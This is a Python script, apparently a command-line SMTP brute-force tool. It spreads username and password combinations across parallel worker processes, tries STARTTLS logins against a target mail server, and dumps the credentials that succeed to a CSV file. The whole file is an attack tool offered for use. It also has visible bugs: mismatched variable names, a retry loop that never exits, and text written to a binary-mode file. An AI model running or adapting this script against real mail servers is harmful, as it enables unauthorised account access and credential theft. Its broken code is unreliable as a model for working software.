#! /usr/bin/env python3

import smtplib
from datetime import date
from optparse import OptionParser
from colorama import Fore, Back, Style
from multiprocessing import Lock, Pool, cpu_count
from time import strftime, localtime, sleep, time

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

port = 25
lock = Lock()

def login(mail_server, port, user, password):
    t1 = time()
    try:
        smtp = smtplib.SMTP(mail_server, port=port)
        smtp.starttls()
        smtp.login(user, password)
        smtp.quit()
        t2 = time()
        return True, t2-t1
    except smtplib.SMTPAuthenticationError:
        t2 = time()
        return False, t2-t1
    except Exception as err:
        t2 = time()
        return err, t2-t1
def brute_force(thread_index, mail_server, port, credentials):
    successful_logins = {}
    for credential in credentials:
        status = ''
        while status != True and status != False:
            status = login(mail_server, port, credential[0], credential[1])
            if status[0] == True:
                successful_logins[credential[0]] = credential[1]
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
            elif status[0] == False:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
            else:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
    return successful_logins
def main(server, port, credentials):
    successful_logins = {}
    thread_count = cpu_count()
    pool = Pool(thread_count)
    display('+', f"Starting {Back.MAGENTA}{thread_count} Brute Force Threads{Back.RESET}")
    display(':', f"Credentials / Threads = {Back.MAGENTA}{len(credentials)//thread_count}{Back.RESET}")
    threads = []
    credentials_count = len(credentials)
    credential_groups = [credentials[group*credentials_count//thread_count: (group+1)*credentials_count//thread_count] for group in range(thread_count)]
    for index, credential_group in enumerate(credential_groups):
        threads.append(pool.apply_async(brute_force, (index, server, port, credential_group)))
    for thread in threads:
        successful_logins.update(thread.get())
    pool.close()
    pool.join()
    display('+', f"Threads Finished Excuting")
    return successful_logins

if __name__ == "__main__":
    arguments = get_arguments(('-s', "--server", "server", "Target SMTP Server"),
                              ('-p', "--port", "port", f"Port of Target SMTP Server (Default={port})"),
                              ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                              ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
                              ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
    if not arguments.server:
        display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
        exit(0)
    if not arguments.port:
        arguments.port = port
    else:
        arguments.port = int(arguments.port)
    if not arguments.credentials:
        if not arguments.users:
            display('-', f"Please specify {Back.YELLOW}Target Users{Back.RESET}")
            exit(0)
        else:
            try:
                with open(arguments.users, 'r') as file:
                    arguments.users = [user for user in file.read().split('\n') if user != '']
            except FileNotFoundError:
                arguments.user = arguments.user.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.users}{Back.RESET}")
                exit(0)
            display(':', f"Users Loaded = {Back.MAGENTA}{len(arguments.user)}{Back.RESET}")
        if not arguments.password:
            display('-', f"Please specify {Back.YELLOW}Passwords{Back.RESET}")
            exit(0)
        else:
            try:
                with open(arguments.password, 'r') as file:
                    arguments.password = [password for password in file.read().split('\n') if password != '']
            except FileNotFoundError:
                arguments.password = arguments.password.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.password}{Back.RESET}")
                exit(0)
            display(':', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        arguments.credentials = []
        for user in arguments.user:
            for password in arguments.password:
                arguments.credentials.append([user, password])
    else:
        try:
            with open(arguments.credentials, 'r') as file:
                arguments.credentials = [[credential.split(':')[0], ':'.join(credential.split(':')[1:])] for credential in file.read().split('\n') if len(credential.split(':')) > 1]
        except:
            display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
            exit(0)
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    display('+', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
    t1 = time()
    successful_logins = main(arguments.server, arguments.port, arguments.credentials)
    t2 = time()
    display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
    display(':', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
    display(':', f"Time Taken        = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
    display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)/(t2-t1):.2f} logins / seconds{Back.RESET}")
    display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
    with open(arguments.write, 'wb') as file:
        file.write(f"User,Password\n")
        file.write('\n'.join([f"{user},{password}" for user, password in successful_logins.items()]))
    display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")